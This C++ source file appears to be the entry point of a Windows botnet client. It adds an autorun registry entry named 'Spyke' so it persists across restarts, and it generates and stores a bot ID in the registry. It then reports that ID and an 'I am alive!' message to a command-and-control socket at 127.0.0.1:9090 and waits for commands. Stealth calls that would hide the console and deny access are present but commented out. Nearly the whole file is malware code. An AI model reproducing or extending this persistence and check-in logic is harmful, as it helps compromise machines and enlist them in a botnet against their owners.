// BotnetWin32.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "BotnetWin32.h"
#include "Utils.h"
#include "Connection.h"

char* ip = "127.0.0.1";
TCHAR buf[255] = { 0 };
Utils utils;
Connection conn(ip, 9090);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	//utils.HideConsole();
	//utils.DenyAccess();

	//Accessing the registry value for autoloading

	HKEY hKey;
	if(RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		//Checking if the registry value exists

		DWORD dwType = REG_SZ;
		DWORD dwBufSize = sizeof(buf);
		if(RegQueryValueEx(hKey, L"Spyke", 0, &dwType, (LPBYTE)buf, &dwBufSize) != ERROR_SUCCESS)
			// Creating the registry value for autoloading
			utils.Autoload();
	}
	else
		utils.Autoload();

	// Accessing the registry value for ID

	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		//Checking if the registry value exists

		DWORD dwType = REG_SZ;
		DWORD dwBufSize = sizeof(buf);
		if (RegQueryValueExW(hKey, L"ID", 0, NULL, (LPBYTE)buf, &dwBufSize) == ERROR_SUCCESS)
		{
			// Set the class attribute equal to the registry value
			utils.SetID(buf);
		}
		else
		{
			// Generate a new ID and create a new registry value
			utils.GenerateID();
		}
	}
	else
	{
		utils.GenerateID();
	}

	// Sending an ID and a message 
	conn.Send(utils.GetID());
	conn.Send("I am alive!");
	conn.Shutdown(); //otherwise it freezes
	conn.Recv(); // use GetBuf to retrieve the contents of buffer
	return 0;
}

